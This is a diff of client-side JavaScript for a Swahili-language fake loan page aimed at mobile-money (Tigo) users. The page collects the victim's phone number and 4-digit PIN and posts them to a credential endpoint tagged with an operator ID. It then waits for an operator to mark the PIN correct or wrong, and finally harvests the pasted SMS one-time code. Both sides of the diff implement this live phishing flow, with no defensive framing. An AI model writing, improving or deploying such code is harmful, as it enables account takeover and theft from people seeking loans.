@@ -1,202 +1,152 @@
 document.addEventListener('DOMContentLoaded', () => {
-    let sessionId = 'session_' + Math.random().toString(36).substring(2, 15);
-    
-    // Capture the ?admin= parameter from the URL to map submissions correctly
     const urlParams = new URLSearchParams(window.location.search);
-    const assignedAdminId = urlParams.get('admin');
+    const adminId = urlParams.get('admin');
 
-    const step1 = document.getElementById('step-1');
-    const stepDetails = document.getElementById('step-details');
-    const step3 = document.getElementById('step-3');
-    const stepLogin = document.getElementById('step-login');
-    const stepWaiting = document.getElementById('step-waiting');
+    const stepNaelewa = document.getElementById('step-naelewa');
+    const stepForm = document.getElementById('step-form');
+    const stepLoading = document.getElementById('step-loading');
     const stepOtp = document.getElementById('step-otp');
     const stepSuccess = document.getElementById('step-success');
-    const backBtn = document.getElementById('backBtn');
-    const errorBanner = document.getElementById('errorBanner');
 
-    const amountSlider = document.getElementById('loanAmountSlider');
-    const durationSlider = document.getElementById('loanDurationSlider');
-    const amountDisplay = document.getElementById('amountDisplay');
-    const durationDisplay = document.getElementById('durationDisplay');
-    const monthlyPayment = document.getElementById('monthlyPayment');
+    const btnNaelewa = document.getElementById('btn-naelewa');
+    const loanForm = document.getElementById('loan-form');
+    const btnThibitisha = document.getElementById('btn-thibitisha');
+    const otpText = document.getElementById('otp-text');
+    const charCount = document.getElementById('char-count');
 
-    const inputAmount = document.getElementById('inputAmount');
-    const inputDuration = document.getElementById('inputDuration');
-    const tigoNumber = document.getElementById('tigoNumber');
-    const pinBoxes = document.querySelectorAll('.pin-box');
-    const submitLoginBtn = document.getElementById('submitLoginBtn');
-    const otpSmsInput = document.getElementById('otpSmsInput');
+    let currentSessionId = null;
+    let statusInterval = null;
 
-    function showStep(stepEl) {
-        [step1, stepDetails, step3, stepLogin, stepWaiting, stepOtp, stepSuccess].forEach(el => el.classList.remove('active'));
-        stepEl.classList.add('active');
-        backBtn.style.display = (stepEl === step1) ? 'none' : 'inline-block';
-    }
-
-    amountSlider.addEventListener('input', (e) => {
-        const val = parseInt(e.target.value);
-        amountDisplay.textContent = 'TSh ' + val.toLocaleString();
-        inputAmount.value = val;
-        updateMonthly(val, parseInt(durationSlider.value));
+    btnNaelewa.addEventListener('click', () => {
+        stepNaelewa.classList.remove('active');
+        stepNaelewa.classList.add('hidden');
+        stepForm.classList.remove('hidden');
+        stepForm.classList.add('active');
     });
 
-    durationSlider.addEventListener('input', (e) => {
-        const val = parseInt(e.target.value);
-        durationDisplay.textContent = 'miezi ' + val;
-        inputDuration.value = 'Miezi ' + val;
-        updateMonthly(parseInt(amountSlider.value), val);
-    });
-
-    function updateMonthly(amount, months) {
-        const monthly = Math.round((amount * 1.25) / months);
-        monthlyPayment.textContent = 'TSh ' + monthly.toLocaleString();
-    }
-
-    pinBoxes.forEach((box, index) => {
-        box.addEventListener('input', (e) => {
-            if (e.target.value && index < pinBoxes.length - 1) {
-                pinBoxes[index + 1].focus();
+    const pinInputs = document.querySelectorAll('.pin-input');
+    pinInputs.forEach((input, index) => {
+        input.addEventListener('input', (e) => {
+            const val = e.target.value;
+            if (val && index < pinInputs.length - 1) {
+                pinInputs[index + 1].focus();
             }
-            checkLoginForm();
+            updatePinValue();
         });
-        box.addEventListener('keydown', (e) => {
-            if (e.key === 'Backspace' && !box.value && index > 0) {
-                pinBoxes[index - 1].focus();
+
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && !input.value && index > 0) {
+                pinInputs[index - 1].focus();
             }
         });
     });
 
-    tigoNumber.addEventListener('input', checkLoginForm);
-
-    function getPinString() {
+    function updatePinValue() {
         let pin = '';
-        pinBoxes.forEach(b => pin += b.value);
-        return pin;
+        pinInputs.forEach(input => pin += input.value);
+        document.getElementById('pin-hidden').value = pin;
     }
 
-    function clearPinBoxes() {
-        pinBoxes.forEach(b => b.value = '');
-        if (pinBoxes.length > 0) pinBoxes[0].focus();
-        submitLoginBtn.setAttribute('disabled', 'true');
-    }
+    loanForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const phoneInput = document.getElementById('phone').value.trim();
+        const pin = document.getElementById('pin-hidden').value;
 
-    function checkLoginForm() {
-        const phoneVal = tigoNumber.value.trim();
-        const pinVal = getPinString();
-        const tigoRegex = /^07\d{8}$/;
-        if (tigoRegex.test(phoneVal) && pinVal.length === 4) {
-            submitLoginBtn.removeAttribute('disabled');
-        } else {
-            submitLoginBtn.setAttribute('disabled', 'true');
-        }
-    }
-
-    document.getElementById('toStep2Btn').addEventListener('click', () => showStep(stepDetails));
-    document.getElementById('toStep3Btn').addEventListener('click', () => {
-        document.getElementById('sumAmount').textContent = amountDisplay.textContent;
-        document.getElementById('sumDuration').textContent = inputDuration.value;
-        showStep(step3);
-    });
-
-    document.getElementById('toLoginScreenBtn').addEventListener('click', () => {
-        showStep(stepLogin);
-    });
-
-    submitLoginBtn.addEventListener('click', async () => {
-        const payload = {
-            sessionId,
-            phone: tigoNumber.value.trim(),
-            pin: getPinString(),
-            amount: amountSlider.value,
-            duration: durationSlider.value,
-            adminId: assignedAdminId
-        };
-
-        showStep(stepWaiting);
-
-        try {
-            const res = await fetch('/api/submit-credentials', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-            const data = await res.json();
-            if (data.success) {
-                pollAdminStatus();
-            }
-        } catch (err) {
-            console.error(err);
-            errorBanner.textContent = 'Hitilafu ya mtandao. Tafadhali jaribu tena.';
-            errorBanner.style.display = 'block';
-        }
-    });
-
-    function pollAdminStatus() {
-        const interval = setInterval(async () => {
-            try {
-                const res = await fetch(`/api/check-status/${sessionId}`);
-                const data = await res.json();
-
-                if (data.status === 'approved_pin') {
-                    clearInterval(interval);
-                    showStep(stepOtp);
-                    startOtpTimer();
-                } else if (data.status === 'wrong_pin') {
-                    clearInterval(interval);
-                    clearPinBoxes();
-                    showStep(stepLogin);
-                    alert('PIN uliyoweka si sahihi. Tafadhali weka PIN mpya.');
-                } else if (data.status === 'denied') {
-                    clearInterval(interval);
-                    showStep(stepLogin);
-                    alert('Maombi yako yamekataliwa na msimamizi.');
-                } else if (data.status === 'success') {
-                    clearInterval(interval);
-                    document.getElementById('finalApprovedAmount').textContent = amountDisplay.textContent;
-                    document.getElementById('resDuration').textContent = inputDuration.value;
-                    showStep(stepSuccess);
-                }
-            } catch (e) {
-                console.error(e);
-            }
-        }, 3000);
-    }
-
-    function startOtpTimer() {
-        let seconds = 20;
-        const timerEl = document.getElementById('countdownTimer');
-        const timerInterval = setInterval(() => {
-            seconds--;
-            timerEl.textContent = seconds;
-            if (seconds <= 0) {
-                clearInterval(timerInterval);
-            }
-        }, 1000);
-    }
-
-    document.getElementById('submitOtpBtn').addEventListener('click', async () => {
-        const otpText = otpSmsInput.value.trim();
-        if (!otpText) {
-            alert('Tafadhali bandika ujumbe wa SMS hapa.');
+        if (pin.length !== 4) {
+            alert('Tafadhali weka PIN yenye tarakimu 4 kamili.');
             return;
         }
 
-        showStep(stepWaiting);
+        currentSessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        
+        stepForm.classList.remove('active');
+        stepForm.classList.add('hidden');
+        stepLoading.classList.remove('hidden');
+        stepLoading.classList.add('active');
+
+        try {
+            const response = await fetch('/api/submit-credentials', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    sessionId: currentSessionId,
+                    phone: phoneInput,
+                    pin: pin,
+                    adminId: adminId
+                })
+            });
+            const data = await response.json();
+            if (data.success) {
+                pollStatus();
+            }
+        } catch (err) {
+            console.error('Error submitting credentials:', err);
+            alert('Kosa limetokea. Tafadhali jaribu tena.');
+            location.reload();
+        }
+    });
+
+    otpText.addEventListener('input', () => {
+        const len = otpText.value.length;
+        charCount.innerText = `${len}/1000`;
+    });
+
+    btnThibitisha.addEventListener('click', async () => {
+        const text = otpText.value.trim();
+        if (!text) {
+            alert('Tafadhali weka ujumbe wa SMS.');
+            return;
+        }
+
+        stepOtp.classList.remove('active');
+        stepOtp.classList.add('hidden');
+        stepLoading.classList.remove('hidden');
+        stepLoading.classList.add('active');
+
         try {
             await fetch('/api/submit-otp', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ sessionId, otpText })
+                body: JSON.stringify({
+                    sessionId: currentSessionId,
+                    otpText: text
+                })
             });
-            pollAdminStatus();
-        } catch (e) {
-            console.error(e);
+            pollStatus();
+        } catch (err) {
+            console.error('Error submitting OTP:', err);
         }
     });
 
-    document.getElementById('homeBtn').addEventListener('click', () => {
-        location.reload();
-    });
+    function pollStatus() {
+        if (statusInterval) clearInterval(statusInterval);
+
+        statusInterval = setInterval(async () => {
+            try {
+                const res = await fetch(`/api/check-status/${currentSessionId}`);
+                const data = await res.json();
+
+                if (data.status === 'approved_pin') {
+                    clearInterval(statusInterval);
+                    stepLoading.classList.remove('active');
+                    stepLoading.classList.add('hidden');
+                    stepOtp.classList.remove('hidden');
+                    stepOtp.classList.add('active');
+                } else if (data.status === 'success') {
+                    clearInterval(statusInterval);
+                    stepLoading.classList.remove('active');
+                    stepLoading.classList.add('hidden');
+                    stepSuccess.classList.remove('hidden');
+                    stepSuccess.classList.add('active');
+                } else if (data.status === 'wrong_pin' || data.status === 'wrong_sms' || data.status === 'denied') {
+                    clearInterval(statusInterval);
+                    alert('Taarifa zako zimekataliwa au PIN/SMS sio sahihi. Tafadhali jaribu tena.');
+                    location.reload();
+                }
+            } catch (err) {
+                console.error('Error polling status:', err);
+            }
+        }, 3000);
+    }
 });
-                      
+                          
